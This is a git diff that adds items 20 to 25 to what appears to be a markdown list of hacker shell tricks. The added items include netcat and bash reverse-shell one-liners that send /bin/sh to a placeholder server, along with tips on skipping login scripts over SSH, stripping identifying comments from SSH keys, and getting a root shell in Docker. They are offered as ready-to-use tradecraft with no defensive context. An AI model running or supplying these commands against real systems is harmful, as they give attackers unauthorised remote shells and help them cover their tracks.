@@ -253,6 +253,76 @@ Make a noise (BING) when anyone tries to SSH into our system (could be an admin!
 # tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 ```
 
+**20. Generate quick random hex**
+
+Good for quick passwords without human element.
+
+```
+$ openssl rand -base64 24
+```
+
+**21. Reverse shell with nc**
+
+First listen for a shell on your server.
+
+```
+$ nc -lvp 666
+```
+
+Reverse connect with netcat.
+
+```
+$ nc -e /bin/sh yourserver.com 666
+```
+
+Reverse connect with netcat built without `-e` flag.
+
+```
+$ mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2>&1|nc yourserver.com 666 >/tmp/x
+```
+
+**22. Reverse shell with bash**
+
+Replace `xx.xx.xx.xx` with your server ip.
+
+```
+$ bash -i >& /dev/tcp/xx.xx.xx.xx/666 0>&1
+```
+
+**23. SSH with different shell
+
+Bypass events that exist in login scripts such as `.profile` and `.bashrc`.
+
+```
+$ ssh user@server sh
+
+```
+
+**24. Strip SSH key comment field.
+
+`ssh-keygen` automatically fills this field with local user and host, and can be recorded during connection.
+
+Command strips comment field from both private and public keys.
+
+```
+$ ssh-keygen -c -C "redacted" -f ~/.ssh/id_rsa
+```
+
+**25. Get a root shell in Docker container.
+
+If the container is already running:
+
+```
+$ docker exec -it --user root <container-name> /bin/bash
+```
+
+If the container is not running:
+
+```
+$ docker run -it --user root --entrypoint /bin/bash <container>
+```
+
+
 
 --------------------------------------------------------------------------
 Shoutz: ADM
